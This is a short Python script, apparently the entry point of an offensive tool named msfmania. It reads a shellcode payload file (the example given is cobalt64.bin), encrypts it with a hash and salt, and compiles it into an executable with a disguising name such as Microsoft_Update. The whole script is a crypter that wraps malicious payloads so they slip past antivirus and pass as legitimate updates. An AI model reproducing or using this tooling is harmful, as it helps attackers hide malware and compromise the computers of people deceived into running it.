from msfmania import compiler, core, encryption
import argparse

payload = ""
filename = ""

if __name__ == '__main__':
    core.banner()

    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--payload", help="Select the payload file to use (ex: cobalt64.bin)", required=True)
    parser.add_argument("-o", "--filename", help="Choose the name of the output file (ex: Microsoft_Update)", required=True)

    args = parser.parse_args()

    payload += str(args.payload)
    filename += str(args.filename)

    payload = open(payload, "rb").read()
    encrypted_shellcode, payload_hash, salt = encryption.shellcode_encryption(payload)
    
    # Create template and compile
    compiler.create_template(encrypted_shellcode, payload_hash, salt)
    compiler.compile(filename)
    